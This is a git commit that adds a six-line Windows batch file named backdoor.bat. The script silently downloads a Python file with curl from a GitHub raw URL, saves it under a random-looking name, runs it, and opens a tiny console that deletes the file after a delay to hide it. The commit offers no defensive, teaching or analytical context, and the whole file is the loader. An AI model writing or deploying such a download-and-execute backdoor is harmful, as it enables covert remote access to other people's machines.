b4870e48e7483f9ef524f668431f51225e7a9aa9
snowyxxdev <snowyware@gmail.com>
2024-10-05 21:32:15 +0100

    Create backdoor.bat

---
+++ backdoor.bat
@@ -0,0 +1,6 @@
+@echo off
+curl -s https://raw.githubusercontent.com/snowyxxdev/cloud-server/refs/heads/main/server.py -o AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py
+title server
+cls
+start cmd /c "mode con: cols=20 lines=1 && title server && timeout /t 2 /nobreak >nul && del AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py && exit"
+python AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py
